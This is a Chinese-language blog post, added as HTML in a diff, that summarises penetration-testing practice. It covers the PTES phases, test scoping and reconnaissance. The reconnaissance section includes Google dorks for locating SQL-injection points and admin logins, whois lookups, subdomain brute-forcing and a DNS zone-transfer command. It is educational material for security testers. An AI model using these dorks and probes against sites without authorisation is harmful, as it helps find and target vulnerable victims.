@@ -1,0 +1,1518 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="PT,渗透测试,penetration testing" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="首先上张图，内容为常见的渗透测试攻击检测内容：    当然，还有PTES(Penetration Testing Execution Standard) 渗透测试执行标准，可以去PTES官网看详细内容 这里提供一个翻译版的图表内容PTES标准 渗透测试部分总结最后更新于  2018.01.15">
+<meta name="keywords" content="PT,渗透测试,penetration testing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试相关总结">
+<meta property="og:url" content="http://yoursite.com/blog/penetration-testing/index.html">
+<meta property="og:site_name" content="empty_xl Blog">
+<meta property="og:description" content="首先上张图，内容为常见的渗透测试攻击检测内容：    当然，还有PTES(Penetration Testing Execution Standard) 渗透测试执行标准，可以去PTES官网看详细内容 这里提供一个翻译版的图表内容PTES标准 渗透测试部分总结最后更新于  2018.01.15">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/blog/penetration-testing/penetration-testing.png">
+<meta property="og:image" content="http://yoursite.com/blog/penetration-testing/reverse-query.png">
+<meta property="og:updated_time" content="2018-03-05T04:40:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试相关总结">
+<meta name="twitter:description" content="首先上张图，内容为常见的渗透测试攻击检测内容：    当然，还有PTES(Penetration Testing Execution Standard) 渗透测试执行标准，可以去PTES官网看详细内容 这里提供一个翻译版的图表内容PTES标准 渗透测试部分总结最后更新于  2018.01.15">
+<meta name="twitter:image" content="http://yoursite.com/blog/penetration-testing/penetration-testing.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QT63IJTEZX',
+      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
+      indexName: 'emptyxl.github.io',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/blog/penetration-testing/"/>
+
+
+
+
+
+  <title>渗透测试相关总结 | empty_xl Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-90390918-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">empty_xl Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Hello World！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/penetration-testing/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="empty_xl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="empty_xl Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试相关总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-19T20:12:11+08:00">
+                2018-01-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-03-05T12:40:32+08:00">
+                2018-03-05
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/penetration-testing/" itemprop="url" rel="index">
+                    <span itemprop="name">penetration testing</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>首先上张图，内容为常见的渗透测试攻击检测内容：</p>
+<img src="/blog/penetration-testing/penetration-testing.png" alt="penetration-testing" title="penetration-testing">  
+<p>当然，还有<code>PTES</code>(Penetration Testing Execution Standard) 渗透测试执行标准，可以去<a href="http://www.pentest-standard.org/index.php/Main_Page" target="_blank" rel="external">PTES官网看详细内容</a></p>
+<p>这里提供一个翻译版的图表内容<a href="http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf" target="_blank" rel="external">PTES标准</a></p>
+<p>渗透测试部分总结最后更新于  <strong>2018.01.15</strong></p>
+<a id="more"></a>
+<h2 id="PTES-渗透测试执行标准"><a href="#PTES-渗透测试执行标准" class="headerlink" title="PTES 渗透测试执行标准"></a>PTES 渗透测试执行标准</h2><p>渗透测试执行标准PTES一般分为一下7个阶段：</p>
+<ol>
+<li><p>前期交互 阶段</p>
+<blockquote>
+<p>前期交互阶段通常是由你与客户组织进行讨论，来确定渗透测试的范围和目标。这个阶段最为关键的是需要让客户组织明确清晰地了解渗透测试将设计哪些目标</p>
+</blockquote>
+</li>
+<li><p>情报收集 阶段</p>
+<blockquote>
+<p>在情报收集阶段，你需要采用各种可能的方法来收集将要攻击的客户组织的所有信息，包括使用社交mentioned网络、Google Hacking技术、目标系统踩点等等。</p>
+</blockquote>
+</li>
+<li><p>威胁建模 阶段</p>
+<blockquote>
+<p>威胁建木主要使用你在情报搜集阶段所获取到的信息，来标识出目标系统上可能存在的安全漏洞与弱点。在进行威胁建模时，你将确定最为高校的攻击方法、你所需要进一步获取到的信息，以及从哪里攻破目标系统。在威胁建模阶段，你通常需要将客户组织作为敌手看待，然后以攻击者的视角和思维来尝试利用目标系统的弱点。</p>
+</blockquote>
+</li>
+<li><p>漏洞分析 阶段</p>
+<blockquote>
+<p>一旦确定最为可行的攻击方法之后，你需要考虑你该如何取得目标系统的访问权。在漏洞分析极端，你将综合从前面几个环节中获取到的信息，并从中分析和理解哪些攻击途径会是可行的。特别需要重点分析端口和漏洞扫描结果，攫取到的服务“旗帜”信息，以及在情报收集环节中得到的其他关键信息。</p>
+</blockquote>
+</li>
+</ol>
+<ol>
+<li><p>渗透攻击 阶段</p>
+<blockquote>
+<p>最好是在你基本上能够确信特定渗透攻击会成功的时候，才真正对目标系统实施这次渗透攻击，当然在目标系统中可能存在着一些你没有预期到的安全防护措施，使得这次渗透攻击无法成功。但是要记住的是，在你尝试要出发一个漏洞时，你应该清晰的了解目标系统存在这个漏洞，进行大量漫无目的的渗透尝试之后期待奇迹般地出现一个shell根本是痴心妄想。</p>
+</blockquote>
+</li>
+<li><p>后渗透攻击 阶段</p>
+<blockquote>
+<p>后渗透攻击节段从你已经攻陷了客户组织的一些系统或取得域管理权限之后开始</p>
+<p>在后渗透测试阶段中，就需要你在这些难以处理的场景中寻找可用信息，激发灵感，并达成你所设置的攻击目标，从攻击者的角度，一个普通攻击者往往在攻陷系统后将他的大部分时间用于千篇一律的操作，然而作为一名这也的渗透测试者，你需要想恶意攻击者那样去思考，具有创新意识，能够迅速的反应，并依赖于你的智慧和经验，而不是使用那些自动化的攻击工具。</p>
+</blockquote>
+</li>
+<li><p>报告阶段</p>
+<blockquote>
+<p>报告是渗透测试过程中最为重要的因素，你将使用报告文档来交流你在渗透测试过程中做了哪些，如何做的，以及最为重要的——客户组织如何修复你所发现的安全漏洞与弱点。报告至少应该分为摘要、过程演示和技术发现这几个部分。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>以下总结渗透测试的常见步骤和相应工具，持续更新.</p>
+<h3 id="范围界定"><a href="#范围界定" class="headerlink" title="范围界定"></a>范围界定</h3><ul>
+<li>确定需求<ul>
+<li>整体项目时间</li>
+<li>测试 <code>IP</code> 和 <code>域名</code> 范围</li>
+<li>可接受的<code>社会工程学</code>方法</li>
+<li>渗透测试的具体类型（黑盒、白盒、内部、外部、是否进行DoS攻击）</li>
+<li>网络设备类型（防火墙、路由器、交换机、调制解调器、负载平衡器、IDS、IPS，还是其他类型的硬件设备）</li>
+<li>组织结构关系</li>
+<li>预算概要</li>
+<li>交付成果的具体类型</li>
+</ul>
+</li>
+<li>确定测试流程<ul>
+<li>解决人员配置</li>
+<li>成本分析</li>
+<li>保密协议</li>
+<li>渗透测试合同</li>
+<li>操作规则</li>
+</ul>
+</li>
+</ul>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>用于收集域名或IP地址范围，常见方法如下：</p>
+<ul>
+<li><a href="#google-hacking"><code>Google Hacking</code> / <code>Google Dorks</code></a></li>
+<li><a href="#whois">whois</a>   / <a href="#reverse-query">whois反查</a></li>
+<li><a href="#subdomain">子域名收集- subDomainsBrute/Layer</a></li>
+</ul>
+<p><span id="google-hacking"></span></p>
+<h5 id="Google-Hacking-Google-Dorks"><a href="#Google-Hacking-Google-Dorks" class="headerlink" title="# Google Hacking / Google Dorks"></a># Google Hacking / Google Dorks</h5><p>使用搜索引擎来进行信息收集，往往能搜到很多有用的信息，当然也是一个非常靠技巧的事情。以下举一些简单的例子:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">最简单sql注入点搜索:</div><div class="line"><span class="string">inurl:</span>php?id=</div><div class="line"></div><div class="line">针对某个域名搜索相关信息</div><div class="line">site:xxx.com</div><div class="line"><span class="string">site:</span>xxx.com <span class="string">intitle:</span><span class="string">"admin login"</span></div><div class="line"><span class="string">site:</span>xxx.com <span class="string">filetype:</span>doc <span class="string">intext:</span>pass</div><div class="line"></div><div class="line">查看某个域名的url中是否有某些页面(有些框架的通用漏洞在多个网站中都会存在)</div><div class="line"><span class="string">site:</span>xxx.com <span class="string">inurl:</span>admin.php</div></pre></td></tr></table></figure>
+<p>当然，对于新手来说不知道去搜索些什么，可以看<a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="external">Google Dorks</a> 里面提供了很多搜索的内容，可以供新手学习思路或直接使用，其对于<code>payload</code>已经分好类。</p>
+<p><span id="whois"></span></p>
+<h5 id="whois"><a href="#whois" class="headerlink" title="# whois"></a># whois</h5><p>WHOIS是一个标准的互联网协议，可用于收集网络注册、注册域名、IP地址和自治系统的信息。<code>Linux</code> 带有<code>whois</code>客户端程序<code>whois</code>，一般可直接运行。</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">    whois hellohxk.com</div><div class="line">    </div><div class="line">    Domain <span class="string">Name:</span> HELLOHXK.COM</div><div class="line">    Registry Domain <span class="string">ID:</span> <span class="number">2083889348</span>_DOMAIN_COM-VRSN</div><div class="line">    Registrar WHOIS <span class="string">Server:</span> grs-whois.hichina.com</div><div class="line">    Registrar <span class="string">URL:</span> <span class="string">http:</span><span class="comment">//www.net.cn</span></div><div class="line">    Updated <span class="string">Date:</span> <span class="number">2017</span><span class="number">-12</span><span class="number">-21</span><span class="string">T03:</span><span class="number">03</span>:<span class="number">06</span>Z</div><div class="line">    Creation <span class="string">Date:</span> <span class="number">2016</span><span class="number">-12</span><span class="number">-22</span><span class="string">T04:</span><span class="number">24</span>:<span class="number">38</span>Z</div><div class="line">    Registry Expiry <span class="string">Date:</span> <span class="number">2018</span><span class="number">-12</span><span class="number">-22</span><span class="string">T04:</span><span class="number">24</span>:<span class="number">38</span>Z</div><div class="line"><span class="symbol">    Registrar:</span> HiChina Zhicheng Technology Ltd.</div><div class="line">    Registrar IANA <span class="string">ID:</span> <span class="number">420</span></div><div class="line">    Registrar Abuse Contact <span class="string">Email:</span> DomainAbuse<span class="meta">@service</span>.aliyun.com</div><div class="line">    Registrar Abuse Contact <span class="string">Phone:</span> +<span class="number">86.95187</span></div><div class="line">    Domain <span class="string">Status:</span> ok <span class="string">https:</span><span class="comment">//icann.org/epp#ok</span></div><div class="line">    Name <span class="string">Server:</span> DNS15.HICHINA.COM</div><div class="line">    Name <span class="string">Server:</span> DNS16.HICHINA.COM</div><div class="line"><span class="symbol">    DNSSEC:</span> unsigned</div><div class="line">    URL of the ICANN Whois Inaccuracy Complaint <span class="string">Form:</span> <span class="string">https:</span><span class="comment">//www.icann.org/wicf/</span></div><div class="line">&gt;&gt;&gt; Last update of whois <span class="string">database:</span> <span class="number">2018</span><span class="number">-02</span><span class="number">-23</span><span class="string">T12:</span><span class="number">34</span>:<span class="number">09</span>Z &lt;&lt;&lt;</div></pre></td></tr></table></figure>
+<p>可以看到显示的是阿里云的联系方式，这是因为我域名是在阿里云买的，同时选择了域名隐私保护。一些没有使用隐私保护的网站或者非VPS会显示其相关注册人的个人信息。</p>
+<p>当然也可以通过各种域名服务提供商进行查询，不过一般其只显示自己家的域名信息。</p>
+<ul>
+<li><a href="www.whois.net">www.whois.net</a></li>
+<li><a href="www.internic.net/whois.html">www.internic.net/whois.html</a></li>
+<li><a href="www.arin.net/whois/">www.arin.net/whois/</a></li>
+<li><a href="www.db.ripe.net/whois">www.db.ripe.net/whois</a></li>
+<li><a href="www.apnic.net/apnic-info/whois_search2">www.apnic.net/apnic-info/whois_search2</a></li>
+</ul>
+<p><span id="reverse-query"></span></p>
+<h5 id="whois反查"><a href="#whois反查" class="headerlink" title="# whois反查"></a># whois反查</h5><p>有时候，同一个人往往使用同一个邮箱或电话来注册域名，我们想获取相关的信息，就是<code>whois</code>反查。</p>
+<p>举个例子，我们使用<a href="http://whois.chinaz.com/reverse/" target="_blank" rel="external">站长之家的邮箱反查</a>去查询我们上面的阿里云邮箱:</p>
+<img src="/blog/penetration-testing/reverse-query.png" alt="reverse-query" title="reverse-query">  
+<p><span id="subdomain"></span></p>
+<h5 id="子域名收集"><a href="#子域名收集" class="headerlink" title="# 子域名收集"></a># 子域名收集</h5><ul>
+<li>subDomainsBrute</li>
+<li>Layer</li>
+</ul>
+<p>两款子域名猜解的工具，<strong>其原理都是使用枚举</strong>，所使用的规则或字典越强大，更可能发现更多的有效子域名。<code>kali linux</code>自带的<code>dnsenum</code>附加了常见域名的字典，<code>dns-big</code>字典我放在了<a href="https://github.com/emptyxl/dns_subdomain_bruteforce/blob/master/dns-big.txt" target="_blank" rel="external">github上</a></p>
+<h4 id="IP地址信息"><a href="#IP地址信息" class="headerlink" title="IP地址信息"></a>IP地址信息</h4><ul>
+<li><a href="#dig">host / dig</a></li>
+<li><a href="#dnsenmu">dnsenmu</a></li>
+<li><a href="#dnsdict6">dnsdict6</a></li>
+<li><a href="#DMitry">DMitry</a></li>
+<li><a href="#tcptraceroute">tcptraceroute</a></li>
+<li><a href="#DNS-Zone-Transfer">DNS-Zone-Transfer</a></li>
+</ul>
+<p><span id="reverse-query"></span></p>
+<h5 id="host-dig"><a href="#host-dig" class="headerlink" title="# host / dig"></a># host / dig</h5><p><strong>host</strong></p>
+<blockquote>
+<p>host is a simple utility for performing DNS lookups.</p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">host</span>  <span class="selector-tag">-v</span> <span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span></div><div class="line"></div><div class="line"><span class="selector-tag">Trying</span> "<span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span>"</div><div class="line">;; <span class="selector-tag">-</span>&gt;&gt;<span class="selector-tag">HEADER</span>&lt;&lt;<span class="selector-tag">-</span> <span class="selector-tag">opcode</span>: <span class="selector-tag">QUERY</span>, <span class="selector-tag">status</span>: <span class="selector-tag">NOERROR</span>, <span class="selector-tag">id</span>: 39349</div><div class="line">;; <span class="selector-tag">flags</span>: <span class="selector-tag">qr</span> <span class="selector-tag">rd</span> <span class="selector-tag">ra</span>; <span class="selector-tag">QUERY</span>: 1, <span class="selector-tag">ANSWER</span>: 2, <span class="selector-tag">AUTHORITY</span>: 2, <span class="selector-tag">ADDITIONAL</span>: 0</div><div class="line"></div><div class="line">;; <span class="selector-tag">QUESTION</span> <span class="selector-tag">SECTION</span>:</div><div class="line">;<span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span>.		<span class="selector-tag">IN</span>	<span class="selector-tag">A</span></div><div class="line"></div><div class="line">;; <span class="selector-tag">ANSWER</span> <span class="selector-tag">SECTION</span>:</div><div class="line"><span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span>.	319	<span class="selector-tag">IN</span>	<span class="selector-tag">CNAME</span>	<span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span><span class="selector-class">.w</span><span class="selector-class">.kunlunar</span><span class="selector-class">.com</span>.</div><div class="line"><span class="selector-tag">www</span><span class="selector-class">.meishichina</span><span class="selector-class">.com</span><span class="selector-class">.w</span><span class="selector-class">.kunlunar</span><span class="selector-class">.com</span>. 269	<span class="selector-tag">IN</span> <span class="selector-tag">A</span>	125<span class="selector-class">.76</span><span class="selector-class">.247</span><span class="selector-class">.169</span></div><div class="line"></div><div class="line">......</div></pre></td></tr></table></figure>
+<p><code>host</code>也可完成<code>DNS zone transfer</code>使用如下命令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host -l xx<span class="selector-class">.com</span> dns<span class="selector-class">.xx</span><span class="selector-class">.com</span></div></pre></td></tr></table></figure>
+<p>如果DNS服务器配置不当，就有可能造成这样的攻击，不过现代一般都将这个功能关闭了。关于DNS域传送漏洞，会在后面提到。</p>
+<p><strong>dig</strong><br>比较常用的工具，灵活且强大</p>
+<blockquote>
+<p>dig (domain information groper) is a flexible tool for interrogating DNS name servers. It performs DNS lookups and displays the answers that are returned from the name server(s) that were queried. Most DNS administrators use dig to troubleshoot DNS problems because of its flexibility, ease of use and clarity of output. Other lookup tools tend to have less functionality than dig.</p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">dig</span> <span class="selector-tag">hellohxk</span><span class="selector-class">.com</span></div><div class="line"></div><div class="line">; &lt;&lt;&gt;&gt; <span class="selector-tag">DiG</span> 9<span class="selector-class">.8</span><span class="selector-class">.3-P1</span> &lt;&lt;&gt;&gt; <span class="selector-tag">hellohxk</span><span class="selector-class">.com</span></div><div class="line">;; <span class="selector-tag">global</span> <span class="selector-tag">options</span>: +<span class="selector-tag">cmd</span></div><div class="line">;; <span class="selector-tag">Got</span> <span class="selector-tag">answer</span>:</div><div class="line">;; <span class="selector-tag">-</span>&gt;&gt;<span class="selector-tag">HEADER</span>&lt;&lt;<span class="selector-tag">-</span> <span class="selector-tag">opcode</span>: <span class="selector-tag">QUERY</span>, <span class="selector-tag">status</span>: <span class="selector-tag">NOERROR</span>, <span class="selector-tag">id</span>: 43214</div><div class="line">;; <span class="selector-tag">flags</span>: <span class="selector-tag">qr</span> <span class="selector-tag">rd</span> <span class="selector-tag">ra</span>; <span class="selector-tag">QUERY</span>: 1, <span class="selector-tag">ANSWER</span>: 1, <span class="selector-tag">AUTHORITY</span>: 2, <span class="selector-tag">ADDITIONAL</span>: 16</div><div class="line"></div><div class="line">;; <span class="selector-tag">QUESTION</span> <span class="selector-tag">SECTION</span>:</div><div class="line">;<span class="selector-tag">hellohxk</span><span class="selector-class">.com</span>.			<span class="selector-tag">IN</span>	<span class="selector-tag">A</span></div><div class="line"></div><div class="line">;; <span class="selector-tag">ANSWER</span> <span class="selector-tag">SECTION</span>:</div><div class="line"><span class="selector-tag">hellohxk</span><span class="selector-class">.com</span>.		49	<span class="selector-tag">IN</span>	<span class="selector-tag">A</span>	103<span class="selector-class">.72</span><span class="selector-class">.145</span><span class="selector-class">.7</span></div><div class="line"></div><div class="line">;; <span class="selector-tag">AUTHORITY</span> <span class="selector-tag">SECTION</span>:</div><div class="line"><span class="selector-tag">hellohxk</span><span class="selector-class">.com</span>.		85758	<span class="selector-tag">IN</span>	<span class="selector-tag">NS</span>	<span class="selector-tag">dns15</span><span class="selector-class">.hichina</span><span class="selector-class">.com</span>.</div><div class="line"><span class="selector-tag">hellohxk</span><span class="selector-class">.com</span>.		85758	<span class="selector-tag">IN</span>	<span class="selector-tag">NS</span>	<span class="selector-tag">dns16</span><span class="selector-class">.hichina</span><span class="selector-class">.com</span>.</div></pre></td></tr></table></figure>
+<p>常见的记录类型如下:</p>
+<ul>
+<li><p><code>A</code>记录  实现  <code>domain name =&gt; IP addr</code></p>
+  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">nslookup</span> -querytype=a hellohxk.com</div><div class="line"></div><div class="line">Server:		<span class="number">202.117.112.3</span></div><div class="line">Address:	<span class="number">202.117.112.3</span><span class="comment">#53</span></div><div class="line"></div><div class="line">N<span class="literal">on</span>-authoritative answer:</div><div class="line">Name:	hellohxk.com</div><div class="line">Address: <span class="number">103.72.145.7</span></div><div class="line"></div><div class="line">N<span class="literal">on</span>-authoritative answer: 它的出现代表这个结果是从服务器的缓存中得到的，这不是一个授权的答案。</div></pre></td></tr></table></figure>
+<p>  如果同一个域名指向多个A记录 每次返回的数据包含了两个IP地址，但是在返回的过程中数据排列的顺序每次都不相同。<br>  由于大部分的客户端只选择第一条记录所以通过这种方式可以实现一定程度的负载均衡。</p>
+</li>
+<li><p><code>MX</code>记录  实现 <code>Mail服务</code></p>
+  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">nslookup -querytype=mx hellohxk<span class="selector-class">.com</span></div><div class="line"></div><div class="line">Server:		<span class="number">202.117</span>.<span class="number">112.3</span></div><div class="line">Address:	<span class="number">202.117</span>.<span class="number">112.3</span>#<span class="number">53</span></div><div class="line"></div><div class="line">Non-authoritative answer:</div><div class="line">hellohxk<span class="selector-class">.com</span>	mail exchanger = <span class="number">10</span> mxw<span class="selector-class">.mxhichina</span><span class="selector-class">.com</span>.</div><div class="line">hellohxk<span class="selector-class">.com</span>	mail exchanger = <span class="number">5</span> mxn<span class="selector-class">.mxhichina</span><span class="selector-class">.com</span>.</div></pre></td></tr></table></figure>
+<p>  即在给<code>mail@xx.com</code>发邮件时，会去进行域名解析，查找<code>MX记录</code>。<br>  先找权重数最小的服务器（比如说是 10），如果能连通，那么就将服务器发送过去；如果无法连通 <code>mx</code>记录为<code>10</code> 的服务器，那么才将邮件发送到权重为<code>20</code>的 mail 服务器上。<br>  权重<code>20</code>的服务器在配置上只是暂时缓存mail ，当权重<code>20</code>的服务器能连通权重为<code>10</code>的服务器时，仍会将邮件发送的权重为<code>10</code>的 Mail 服务器上。当然，这个机制需要在 Mail 服务器上配置。</p>
+</li>
+<li><p><code>CNAME</code>记录 实现 <code>域名别称的作用</code></p>
